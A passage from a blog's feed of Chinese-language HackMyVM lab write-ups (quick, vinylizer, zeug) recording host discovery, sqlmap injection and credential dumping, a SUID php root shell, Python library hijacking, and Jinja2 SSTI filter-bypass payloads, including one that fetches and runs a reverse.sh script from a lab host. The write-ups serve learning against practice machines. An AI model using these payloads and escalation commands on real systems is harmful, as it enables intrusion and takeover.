</span></span><span style="display:flex;"><span>LDVK@dYiEa2I1lnjrEeoMif 
</span></span></code></pre></div><h2 id="提权">提权</h2>
<p>这个逻辑真的没弄懂 ,好像是先配置这个报告程序, 然后利用利用新增报告的功能点, 打开 vim, 然后获取 root
用 GPT 梳理一下逻辑

<figure class="md-figure">
  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/HMM_zon_image_14.png" alt="HMM_zon_image_14|850" /><figcaption>HMM_zon_image_14|850</figcaption></figure>


</p>
<p>
<figure class="md-figure">
  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/HMM_zon_image_15.png" alt="HMM_zon_image_15|650" /><figcaption>HMM_zon_image_15|650</figcaption></figure>




<figure class="md-figure">
  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/HMM_zon_image_16.png" alt="HMM_zon_image_16|423" /><figcaption>HMM_zon_image_16|423</figcaption></figure>




<figure class="md-figure">
  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/HMM_zon_image_17.png" alt="HMM_zon_image_17|700" /><figcaption>HMM_zon_image_17|700</figcaption></figure>


</p>
]]></content>
            
                 
                    
                 
                    
                         
                        
                            
                             
                                <category scheme="https://l1uyun.one/tags/sec/hackmyvm" term="sec/hackmyvm" label="sec/hackmyvm" />
                            
                        
                    
                
            
        </entry>
    
        
        <entry>
            <title type="html"><![CDATA[quick]]></title><link href="https://l1uyun.one/posts/hmv_quick/" rel="alternate" type="text/html" />
            <id>https://l1uyun.one/posts/hmv_quick/</id>
            
            <published>2024-02-10T22:09:01+08:00</published>
            <updated>2024-11-24T19:10:39+08:00</updated>
            
            
            <content type="html"><![CDATA[<h2 id="host-discovery">host discovery</h2>
<p>主机发现, 重置了 wsl 的环境之后, 发现能够使用 arp-scan 了

<figure class="md-figure">
  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/HMM_quick_image_1.png" alt="HMM_quick_image_1" /><figcaption>HMM_quick_image_1</figcaption></figure>



前后对比

<figure class="md-figure">
  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/HMM_quick_image_2.png" alt="HMM_quick_image_2" /><figcaption>HMM_quick_image_2</figcaption></figure>


</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>192.168.10.12
</span></span></code></pre></div><h2 id="port-scan">port scan</h2>
<p>只有一个 80 端口

<figure class="md-figure">
  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/HMM_quick_image_3.png" alt="HMM_quick_image_3" /><figcaption>HMM_quick_image_3</figcaption></figure>


</p>
<p>服务版本, 默认脚本, 操作系统扫描

<figure class="md-figure">
  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/HMM_quick_image_4.png" alt="HMM_quick_image_4" /><figcaption>HMM_quick_image_4</figcaption></figure>



漏洞扫描

<figure class="md-figure">
  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/HMM_quick_image_5.png" alt="HMM_quick_image_5" /><figcaption>HMM_quick_image_5</figcaption></figure>


</p>
<h2 id="利用远程包含获得-shell">利用远程包含获得 shell</h2>
<p>RFI

<figure class="md-figure">
  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/HMM_quick_image_6.png" alt="HMM_quick_image_6" /><figcaption>HMM_quick_image_6</figcaption></figure>




<figure class="md-figure">
  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/HMM_quick_image_7.png" alt="HMM_quick_image_7" /><figcaption>HMM_quick_image_7</figcaption></figure>


</p>
<h2 id="user-txt-pwd">user. txt PWD</h2>
<p>
<figure class="md-figure">
  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/HMM_quick_image_8.png" alt="HMM_quick_image_8" /><figcaption>HMM_quick_image_8</figcaption></figure>




<figure class="md-figure">
  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/HMM_quick_image_9.png" alt="HMM_quick_image_9" /><figcaption>HMM_quick_image_9</figcaption></figure>


</p>
<h2 id="use-suid-file-to-get-root">use SUID file to get root</h2>
<p><code>find / -type f -perm -u=s 2&gt;/dev/null</code>
发现一个suid的 php</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>./usr/bin/php7.0 -r <span style="color:#e6db74">&#34;pcntl_exec(&#39;/bin/sh&#39;, [&#39;-p&#39;]);&#34;</span>
</span></span></code></pre></div><h2 id="root-txt-pwd">root. txt PWD</h2>
<p>
<figure class="md-figure">
  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/HMM_quick_image_10.png" alt="HMM_quick_image_10" /><figcaption>HMM_quick_image_10</figcaption></figure>


</p>
]]></content>
            
                 
                    
                 
                    
                         
                        
                            
                             
                                <category scheme="https://l1uyun.one/tags/sec/hackmyvm" term="sec/hackmyvm" label="sec/hackmyvm" />
                            
                        
                    
                
            
        </entry>
    
        
        <entry>
            <title type="html"><![CDATA[vinylizer]]></title><link href="https://l1uyun.one/posts/hmv_tiny/" rel="alternate" type="text/html" />
            <id>https://l1uyun.one/posts/hmv_tiny/</id>
            
            <published>2024-02-10T11:51:04+08:00</published>
            <updated>2024-11-24T19:12:03+08:00</updated>
            
            
            <content type="html"><![CDATA[<h2 id="主机发现">主机发现</h2>
<p>使用 nmap 进行主机发现[[THM_Nmap Live Host Discovery(活动主机发现)]]</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo nmap 192.168.10.1/24 -PA -sn -oN portscan/discovery.nmap
</span></span></code></pre></div><p>
<figure class="md-figure">
  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/HMM_vinylizer_image_1.png" alt="HMM_vinylizer_image_1" /><figcaption>HMM_vinylizer_image_1</figcaption></figure>


</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>192.168.10.10
</span></span></code></pre></div><h2 id="端口扫描">端口扫描</h2>
<p>
<figure class="md-figure">
  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/HMM_vinylizer_image_2.png" alt="HMM_vinylizer_image_2" /><figcaption>HMM_vinylizer_image_2</figcaption></figure>




<figure class="md-figure">
  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/HMM_vinylizer_image_3.png" alt="HMM_vinylizer_image_3" /><figcaption>HMM_vinylizer_image_3</figcaption></figure>


</p>
<h2 id="web-侦查">web 侦查</h2>
<p>
<figure class="md-figure">
  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/HMM_vinylizer_image_4.png" alt="HMM_vinylizer_image_4" /><figcaption>HMM_vinylizer_image_4</figcaption></figure>


</p>
<h2 id="利用登录页面的-sql-注入">利用登录页面的 sql 注入</h2>
<p>sqlmap</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo sqlmap http://192.168.10.10/login.php --data <span style="color:#e6db74">&#34;username=admin&amp;password=admin&amp;login=&#34;</span>
</span></span></code></pre></div><p>
<figure class="md-figure">
  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/HMM_vinylizer_image_5.png" alt="HMM_vinylizer_image_5" /><figcaption>HMM_vinylizer_image_5</figcaption></figure>


</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>---
</span></span><span style="display:flex;"><span>Parameter: username <span style="color:#f92672">(</span>POST<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>    Type: time-based blind
</span></span><span style="display:flex;"><span>    Title: MySQL &gt;<span style="color:#f92672">=</span> 5.0.12 AND time-based blind <span style="color:#f92672">(</span>query SLEEP<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>    Payload: username<span style="color:#f92672">=</span>admin<span style="color:#e6db74">&#39; AND (SELECT 7762 FROM (SELECT(SLEEP(5)))rBJA) AND &#39;</span>mJfQ<span style="color:#e6db74">&#39;=&#39;</span>mJfQ&amp;password<span style="color:#f92672">=</span>admin&amp;login<span style="color:#f92672">=</span>
</span></span><span style="display:flex;"><span>---
</span></span></code></pre></div><p>查看所有数据库</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span> sudo sqlmap http://192.168.10.10/login.php --data <span style="color:#e6db74">&#34;username=admin&amp;password=admin&amp;login=&#34;</span> --dbs
</span></span></code></pre></div><p>
<figure class="md-figure">
  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/HMM_vinylizer_image_6.png" alt="HMM_vinylizer_image_6" /><figcaption>HMM_vinylizer_image_6</figcaption></figure>



查看数据库的表信息</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span> sudo sqlmap http://192.168.10.10/login.php --data <span style="color:#e6db74">&#34;username=admin&amp;password=admin&amp;login=&#34;</span> --tables -D vinyl_marketplace
</span></span></code></pre></div><p>
<figure class="md-figure">
  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/HMM_vinylizer_image_7.png" alt="HMM_vinylizer_image_7" /><figcaption>HMM_vinylizer_image_7</figcaption></figure>



查看某一个表的列信息</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo sqlmap http://192.168.10.10/login.php --data <span style="color:#e6db74">&#34;username=admin&amp;password=admin&amp;login=&#34;</span> --columns -D vinyl_marketplace -T users
</span></span></code></pre></div><p>
<figure class="md-figure">
  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/HMM_vinylizer_image_8.png" alt="HMM_vinylizer_image_8" /><figcaption>HMM_vinylizer_image_8</figcaption></figure>



查看对应列的信息</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo sqlmap http://192.168.10.10/login.php --data <span style="color:#e6db74">&#34;username=admin&amp;password=admin&amp;login=&#34;</span> -C username -D vinyl_marketplace -T users --dump
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>sudo sqlmap http://192.168.10.10/login.php --data <span style="color:#e6db74">&#34;username=admin&amp;password=admin&amp;login=&#34;</span> -C password -D vinyl_marketplace -T users --dump
</span></span></code></pre></div><p>
<figure class="md-figure">
  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/HMM_vinylizer_image_9.png" alt="HMM_vinylizer_image_9" /><figcaption>HMM_vinylizer_image_9</figcaption></figure>




<figure class="md-figure">
  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/HMM_vinylizer_image_10.png" alt="HMM_vinylizer_image_10" /><figcaption>HMM_vinylizer_image_10</figcaption></figure>


</p>
<h2 id="获得立足点">获得立足点</h2>
<p>成功登录lana 用户 但是不能 ssh

<figure class="md-figure">
  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/HMM_vinylizer_image_11.png" alt="HMM_vinylizer_image_11" /><figcaption>HMM_vinylizer_image_11</figcaption></figure>


</p>
<p><code>9432522ed1a8fca612b11c3980a031f6</code>

<figure class="md-figure">
  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/HMM_vinylizer_image_12.png" alt="HMM_vinylizer_image_12" /><figcaption>HMM_vinylizer_image_12</figcaption></figure>



md5

<figure class="md-figure">
  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/HMM_vinylizer_image_13.png" alt="HMM_vinylizer_image_13" /><figcaption>HMM_vinylizer_image_13</figcaption></figure>


</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ssh shopadmin@192.168.10.10
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>shopadmin:addicted2vinyl
</span></span></code></pre></div><h2 id="权限提升_python-库劫持">权限提升_python 库劫持</h2>
<p>
<figure class="md-figure">
  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/HMM_vinylizer_image_14.png" alt="HMM_vinylizer_image_14" /><figcaption>HMM_vinylizer_image_14</figcaption></figure>


</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ls -al /usr/bin/python3
</span></span><span style="display:flex;"><span>/usr/lib/python3.10/random. py
</span></span></code></pre></div><p>
<figure class="md-figure">
  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/HMM_vinylizer_image_15.png" alt="HMM_vinylizer_image_15" /><figcaption>HMM_vinylizer_image_15</figcaption></figure>



实际是使用的 python3.10
将 vinylizer 代码下载到本地之后, 寻找利用点, 但是代码逻辑没有发现能够利用的点
发现使用了 random. py 这个第三方库, 尝试第三方库接吃吃

<figure class="md-figure">
  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/HMM_vinylizer_image_16.png" alt="HMM_vinylizer_image_16" /><figcaption>HMM_vinylizer_image_16</figcaption></figure>


 呗
使用 gpt 随便生成一个 random. py 文件

<figure class="md-figure">
  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/HMM_vinylizer_image_17.png" alt="HMM_vinylizer_image_17|500" /><figcaption>HMM_vinylizer_image_17|500</figcaption></figure>


</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># random.py</span>
</span></span><span style="display:flex;"><span>import os
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># 恶意代码</span>
</span></span><span style="display:flex;"><span>print<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;Executing malicious code...&#34;</span><span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># 例如，在Linux环境下创建一个文件来证明执行成功</span>
</span></span><span style="display:flex;"><span>os.system<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;touch /tmp/malicious_code_executed&#39;</span><span style="color:#f92672">)</span>
</span></span></code></pre></div><p>然后复制到靶机上

<figure class="md-figure">
  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/HMM_vinylizer_image_18.png" alt="HMM_vinylizer_image_18" /><figcaption>HMM_vinylizer_image_18</figcaption></figure>



成功替换

<figure class="md-figure">
  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/HMM_vinylizer_image_19.png" alt="HMM_vinylizer_image_19" /><figcaption>HMM_vinylizer_image_19</figcaption></figure>



执行成功

<figure class="md-figure">
  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/HMM_vinylizer_image_20.png" alt="HMM_vinylizer_image_20" /><figcaption>HMM_vinylizer_image_20</figcaption></figure>



获得一个 suid 的 bash

<figure class="md-figure">
  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/HMM_vinylizer_image_21.png" alt="HMM_vinylizer_image_21" /><figcaption>HMM_vinylizer_image_21</figcaption></figure>



root

<figure class="md-figure">
  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/HMM_vinylizer_image_22.png" alt="HMM_vinylizer_image_22" /><figcaption>HMM_vinylizer_image_22</figcaption></figure>


</p>
<h2 id="学习wp">学习wp</h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sqlmap
</span></span><span style="display:flex;"><span>--batch 全自动,不用回答Y
</span></span></code></pre></div><p>
<figure class="md-figure">
  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/HMM_vinylizer_image_23.png" alt="HMM_vinylizer_image_23" /><figcaption>HMM_vinylizer_image_23</figcaption></figure>


</p>
]]></content>
            
                 
                    
                 
                    
                         
                        
                            
                             
                                <category scheme="https://l1uyun.one/tags/sec/hackmyvm" term="sec/hackmyvm" label="sec/hackmyvm" />
                            
                        
                    
                
            
        </entry>
    
        
        <entry>
            <title type="html"><![CDATA[zeug_hard]]></title><link href="https://l1uyun.one/posts/hmv_zeug/" rel="alternate" type="text/html" />
            <id>https://l1uyun.one/posts/hmv_zeug/</id>
            
            <published>2024-02-09T19:30:21+08:00</published>
            <updated>2024-11-24T19:12:29+08:00</updated>
            
            
            <content type="html"><![CDATA[<p>netdiscover</p>
<h2 id="主机发现">主机发现</h2>
<p>启动前

<figure class="md-figure">
  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/HMM_zeug_image_1.png" alt="HMM_zeug_image_1|550" /><figcaption>HMM_zeug_image_1|550</figcaption></figure>



启动后, 以后就先导入 VirtualBox 然后导出, 再导入 VMware 算了

<figure class="md-figure">
  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/HMM_zeug_image_2.png" alt="HMM_zeug_image_2" /><figcaption>HMM_zeug_image_2</figcaption></figure>



靶机 ip 192.168.10.4</p>
<h2 id="端口扫描">端口扫描</h2>
<p>
<figure class="md-figure">
  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/HMM_zeug_image_3.png" alt="HMM_zeug_image_3" /><figcaption>HMM_zeug_image_3</figcaption></figure>


</p>
<p>
<figure class="md-figure">
  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/HMM_zeug_image_4.png" alt="HMM_zeug_image_4|700" /><figcaption>HMM_zeug_image_4|700</figcaption></figure>


</p>
<p>
<figure class="md-figure">
  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/HMM_zeug_image_5.png" alt="HMM_zeug_image_5|550" /><figcaption>HMM_zeug_image_5|550</figcaption></figure>




<figure class="md-figure">
  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/HMM_zeug_image_6.png" alt="HMM_zeug_image_6|600" /><figcaption>HMM_zeug_image_6|600</figcaption></figure>




<figure class="md-figure">
  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/HMM_zeug_image_7.png" alt="HMM_zeug_image_7" /><figcaption>HMM_zeug_image_7</figcaption></figure>


</p>
<h2 id="ftp-匿名登录">FTP 匿名登录</h2>
<p>
<figure class="md-figure">
  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/HMM_zeug_image_8.png" alt="HMM_zeug_image_8" /><figcaption>HMM_zeug_image_8</figcaption></figure>


</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>~/workspace cat README.txt
</span></span><span style="display:flex;"><span>Hi, Cosette, don<span style="color:#e6db74">&#39;t forget to disable the debug mode in the web application, we don&#39;</span>t want security breaches.
</span></span></code></pre></div><p>提示有一个 debug 页面可以利用</p>
<h2 id="web-侦查">web 侦查</h2>
<p>进去之后是一个上传文件的页面, 先去搜了一下 cve, 因为不确定 cms 名称啥的,
后面搜到了 console 目录, 然后访问了 console 目录, 才确定这是 Werkzeug

<figure class="md-figure">
  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/HMM_zeug_image_9.png" alt="HMM_zeug_image_9|900" /><figcaption>HMM_zeug_image_9|900</figcaption></figure>



这里的 cve 用不了
想着来目录扫描一下

<figure class="md-figure">
  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/HMM_zeug_image_10.png" alt="HMM_zeug_image_10|550" /><figcaption>HMM_zeug_image_10|550</figcaption></figure>


</p>
<h2 id="控制台页面">控制台页面</h2>
<p>最后只有主页的文件上传和一个 console 页面能用, console 页面需要一个 PIN
<a href="https://www.daehee.com/werkzeug-console-pin-exploit/" target="_blank" rel="noopener nofollow noreferrer" >https://www.daehee.com/werkzeug-console-pin-exploit/</a>
<a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/werkzeug" target="_blank" rel="noopener nofollow noreferrer" >https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/werkzeug</a>
查到了这两篇文章, 提示需要一些属性, 然后能够计算出 PIN 值

<figure class="md-figure">
  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/HMM_zeug_image_11.png" alt="HMM_zeug_image_11" /><figcaption>HMM_zeug_image_11</figcaption></figure>



利用后面的 SSTI 获取到了这些参数, 但是最终还是利用失败了
最终是利用失败了</p>
<h2 id="服务器端模板注入">服务器端模板注入</h2>
<p>Server Side Template Injection
还是得看主页的渲染, 之前随便上传了个 html 文件 (前端验证, 无所谓的), 确定了是 ssti 注入

<figure class="md-figure">
  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/HMM_zeug_image_12.png" alt="HMM_zeug_image_12" /><figcaption>HMM_zeug_image_12</figcaption></figure>



这里能够执行出结果, 说明有渲染. 执行的过程, 存在 ssti

<figure class="md-figure">
  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/HMM_zeug_image_13.png" alt="HMM_zeug_image_13|332" /><figcaption>HMM_zeug_image_13|332</figcaption></figure>



<code>过滤了 import, os, attr, script. app, mro,[,], init 的 ssti 注入</code>

<figure class="md-figure">
  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/HMM_zeug_image_14.png" alt="HMM_zeug_image_14" /><figcaption>HMM_zeug_image_14</figcaption></figure>



在 payloadallthing 里面找<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#jinja2" target="_blank" rel="noopener nofollow noreferrer" >能用的 payload</a>
2024-02-10-00:55:01
明天晚上再看看</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># 我找到的是这个,能够读取文件,但是没用....</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">{{</span>get_flashed_messages.__globals__.__builtins__.open<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;/etc/passwd&#34;</span><span style="color:#f92672">)</span>.read<span style="color:#f92672">()</span> <span style="color:#f92672">}}</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>wp的payload,神奇的linsum
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">{{</span>lipsum.__globals__.__builtins__.open<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;/etc/passwd&#34;</span><span style="color:#f92672">)</span>.read<span style="color:#f92672">()}}</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># 好吧,我是傻逼,使用eval这个方法可以直接字符串拼接</span>
</span></span><span style="display:flex;"><span> 
</span></span><span style="display:flex;"><span><span style="color:#f92672">{{</span>lipsum.__globals__.__builtins__.eval<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;__impo&#34;</span>+<span style="color:#e6db74">&#34;rt__(\&#34;o&#34;</span>+<span style="color:#e6db74">&#34;s\&#34;).po&#34;</span>+<span style="color:#e6db74">&#34;pen(\&#34;ls -lh /\&#34;).read()&#34;</span><span style="color:#f92672">)}}</span>
</span></span></code></pre></div><p>
<figure class="md-figure">
  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/HMM_zeug_image_15.png" alt="HMM_zeug_image_15" /><figcaption>HMM_zeug_image_15</figcaption></figure>


</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cosette
</span></span><span style="display:flex;"><span>flask.app
</span></span><span style="display:flex;"><span>Flask
</span></span><span style="display:flex;"><span>/home/cosette/zeug/venv/lib/python3.11/site-packages/flask/app.py 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># mac地址</span>
</span></span><span style="display:flex;"><span>00:0c:29:32:d5:b0
</span></span><span style="display:flex;"><span>十进制
</span></span><span style="display:flex;"><span>&gt;&gt;&gt; print<span style="color:#f92672">(</span>0x000c2932d5b0<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">52230804912</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>48329e233f524ec291cce7479927890b
</span></span></code></pre></div><p>
<figure class="md-figure">
  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/HMM_zeug_image_16.png" alt="HMM_zeug_image_16|700" /><figcaption>HMM_zeug_image_16|700</figcaption></figure>




<figure class="md-figure">
  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/HMM_zeug_image_17.png" alt="HMM_zeug_image_17|650" /><figcaption>HMM_zeug_image_17|650</figcaption></figure>




<figure class="md-figure">
  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/HMM_zeug_image_18.png" alt="HMM_zeug_image_18" /><figcaption>HMM_zeug_image_18</figcaption></figure>




<figure class="md-figure">
  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/HMM_zeug_image_19.png" alt="HMM_zeug_image_19|450" /><figcaption>HMM_zeug_image_19|450</figcaption></figure>



但是失败了, 换成 md5 也不行, 搞不明白</p>
<p>去看 wp了</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">{{</span>lipsum.__globals__.__builtins__.eval<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;__impo&#34;</span>+<span style="color:#e6db74">&#34;rt__(\&#34;o&#34;</span>+<span style="color:#e6db74">&#34;s\&#34;).po&#34;</span>+<span style="color:#e6db74">&#34;pen(\&#34;wget http://192.168.10.11:8000/reverse.sh -O /tmp/reverse.sh\&#34;).read()&#34;</span><span style="color:#f92672">)}}</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">{{</span>lipsum.__globals__.__builtins__.eval<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;__impo&#34;</span>+<span style="color:#e6db74">&#34;rt__(\&#34;o&#34;</span>+<span style="color:#e6db74">&#34;s\&#34;).po&#34;</span>+<span style="color:#e6db74">&#34;pen(\&#34;/tmp/reverse.sh\&#34;).read()&#34;</span><span style="color:#f92672">)}}</span>
</span></span></code></pre></div><p>
<figure class="md-figure">
  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/HMM_zeug_image_20.png" alt="HMM_zeug_image_20" /><figcaption>HMM_zeug_image_20</figcaption></figure>


</p>
<p>
<figure class="md-figure">
  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/HMM_zeug_image_21.png" alt="HMM_zeug_image_21" /><figcaption>HMM_zeug_image_21</figcaption></figure>


</p>
<p>
<figure class="md-figure">
  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/HMM_zeug_image_22.png" alt="HMM_zeug_image_22" /><figcaption>HMM_zeug_image_22</figcaption></figure>




<figure class="md-figure">
  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/HMM_zeug_image_23.png" alt="HMM_zeug_image_23" /><figcaption>HMM_zeug_image_23</figcaption></figure>




<figure class="md-figure">
  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/HMM_zeug_image_24.png" alt="HMM_zeug_image_24" /><figcaption>HMM_zeug_image_24</figcaption></figure>


</p>
<p>
<figure class="md-figure">
  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/HMM_zeug_image_25.png" alt="HMM_zeug_image_25" /><figcaption>HMM_zeug_image_25</figcaption></figure>


</p>
<p>
<figure class="md-figure">
  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/HMM_zeug_image_26.png" alt="HMM_zeug_image_26" /><figcaption>HMM_zeug_image_26</figcaption></figure>


</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>strings  /usr/bin/zeug
</span></span></code></pre></div><p>
<figure class="md-figure">
  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/HMM_zeug_image_27.png" alt="HMM_zeug_image_27" /><figcaption>HMM_zeug_image_27</figcaption></figure>


</p>
<p>
<figure class="md-figure">
  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/HMM_zeug_image_28.png" alt="HMM_zeug_image_28" /><figcaption>HMM_zeug_image_28</figcaption></figure>


</p>
<h2 id="提权">提权</h2>
<p>这块涉及计算机底层的东西, 我不懂, 吐了, 先放着</p>
<h2 id="学习-wp">学习 wp</h2>
<p>
<figure class="md-figure">
  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/HMM_zeug_image_29.png" alt="HMM_zeug_image_29" /><figcaption>HMM_zeug_image_29</figcaption></figure>




<figure class="md-figure">
  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/HMM_zeug_image_30.png" alt="HMM_zeug_image_30" /><figcaption>HMM_zeug_image_30</figcaption></figure>




<figure class="md-figure">
